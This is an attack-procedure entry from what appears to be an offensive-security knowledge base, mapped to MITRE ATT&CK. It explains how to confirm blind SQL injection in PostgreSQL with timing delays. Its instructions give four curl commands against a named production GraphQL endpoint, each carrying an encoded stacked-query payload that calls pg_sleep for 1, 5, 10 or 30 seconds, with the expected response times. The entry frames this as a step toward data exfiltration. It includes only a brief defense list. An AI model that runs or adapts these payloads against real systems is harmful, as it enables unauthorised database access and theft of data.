---
tags:
  - timing-attack
  - verification
type: procedure
tools:
  - '[[tools/Curl-for-HTTP-Requests]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/time-curl-1s-sleep]]'
  - '[[commands/time-curl-5s-sleep]]'
  - '[[commands/time-curl-10s-sleep]]'
  - '[[commands/time-curl-30s-sleep]]'
verified: false
platforms:
  - Web
  - PostgreSQL
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:09.948Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 54fd0b27-18e8-473c-b704-6194b2dd6567
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Verify-Injection-Using-Timing-Attacks-with-pg_sleep

## Summary

This procedure uses varying pg_sleep durations in payloads to measure response times, verifying SQL injection via timing side-channel.

## Description

By injecting SELECT pg_sleep(N) with N=1,5,10,30 seconds, response delays directly correlate with execution, proving blind SQL injection capability for data exfiltration.

## Requirements

1. curl with timing (time command)
2. Access to production endpoint
3. Ability to measure response times accurately

## Defense

Defensive measures and detection strategies:

- Rate-limit requests to detect timing probes
- Block pg_sleep or delay functions in queries
- Log and alert on anomalous response times

## Objectives

1. Confirm consistent SQL execution
2. Quantify injection reliability
3. Assess potential for blind exploitation

## Instructions

### Step 1: Test 1-Second Sleep

**Context**: Start with short delay to baseline timing.

**Command** ([[commands/time-curl-1s-sleep]]):
```bash
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%281%29%3B--%27
```

> Expect ~1.631s total time with {} response.

### Step 2: Test 5-Second Sleep

**Context**: Increase duration to strengthen correlation.

**Command** ([[commands/time-curl-5s-sleep]]):
```bash
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%285%29%3B--%27
```

> Expect ~5.726s total time.

### Step 3: Test 10-Second Sleep

**Context**: Further validate with longer delay.

**Command** ([[commands/time-curl-10s-sleep]]):
```bash
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2810%29%3B--%27
```

> Expect ~10.557s total time.

### Step 4: Test 30-Second Sleep

**Context**: Final long test for definitive proof.

**Command** ([[commands/time-curl-30s-sleep]]):
```bash
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
```

> Expect ~30s+ delay.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/time-curl-1s-sleep]]
- [[commands/time-curl-5s-sleep]]
- [[commands/time-curl-10s-sleep]]
- [[commands/time-curl-30s-sleep]]

## Tools Used

- [[tools/Curl-for-HTTP-Requests]]

## Tags

- timing-attack
- verification
